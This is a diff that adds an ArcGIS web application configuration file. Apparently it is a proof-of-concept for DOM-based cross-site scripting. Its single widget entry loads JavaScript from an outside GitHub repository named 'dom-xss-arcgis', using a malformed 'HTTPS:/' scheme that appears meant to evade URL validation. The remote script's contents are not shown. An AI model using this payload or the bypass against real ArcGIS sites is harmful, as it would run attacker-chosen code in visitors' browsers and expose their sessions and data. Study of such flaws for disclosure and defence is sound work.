@@ -1,0 +1,23 @@
+{
+  "theme": { "name": "FoldableTheme" },
+  "portalUrl": "", "appId": "", "authorizedCrossOriginDomains": [],
+  "title": "ArcGIS Web Application",
+  "keepAppState": true,
+  "httpProxy": { "useProxy": true, "url": "/proxy.js" },
+  "isWebTier": false,
+  "geometryService": "https://utility.arcgisonline.com/arcgis/rest/services/Geometry/GeometryServer",
+  "widgetOnScreen": {
+    "widgets": [
+      {
+        "uri": "HTTPS:/github.com/zozoboca/dom-xss-arcgis/Widget.js",
+        "position": { "left": 0, "top": 0, "right": 0, "height": 40, "relativeTo": "browser" }
+      }
+    ]
+  },
+  "map": {
+    "3D": false, "2D": true,
+    "position": { "left": 0, "top": 40, "right": 0, "bottom": 0 },
+    "itemId": "", "mapOptions": { "center": [-98, 40], "scale": 16937199 }
+  },
+  "widgetPool": { "widgets": [] }
+}
